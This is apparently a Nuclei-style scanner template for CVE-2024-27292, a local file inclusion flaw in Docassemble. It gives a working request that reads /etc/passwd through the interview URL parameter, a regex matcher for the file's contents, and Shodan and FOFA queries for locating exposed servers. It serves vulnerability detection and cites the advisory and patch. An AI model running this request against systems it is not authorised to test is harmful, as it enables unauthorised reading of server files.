id: CVE-2024-27292

info:
  name: Docassemble - Local File Inclusion
  author: johnk3r
  severity: high
  description: |
    Docassemble is an expert system for guided interviews and document assembly. The vulnerability allows attackers to gain unauthorized access to information on the system through URL manipulation. It affects versions 1.4.53 to 1.4.96. The vulnerability has been patched in version 1.4.97 of the master branch.
  reference:
    - https://tantosec.com/blog/docassemble/
    - https://github.com/jhpyle/docassemble/security/advisories/GHSA-jq57-3w7p-vwvv
    - https://github.com/jhpyle/docassemble/commit/97f77dc486a26a22ba804765bfd7058aabd600c9
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2024-27292
    cwe-id: CWE-706
    epss-score: 0.93849
    epss-percentile: 0.99864
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"docassemble"
    fofa-query: icon_hash="-575790689"
  tags: cve,cve2024,docassemble,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/interview?i=/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 501
# digest: 4a0a00473045022077f935ac6f72f3871afef000a36b7854579ee55a8ec6e5e4f8d9dc6263ed6c180221008a7fe5257372b6fb16a19e89b198149544ccf7b9aa630a5ad95cbe94f82e2aed:922c64590222798bb761d5b6d8e72950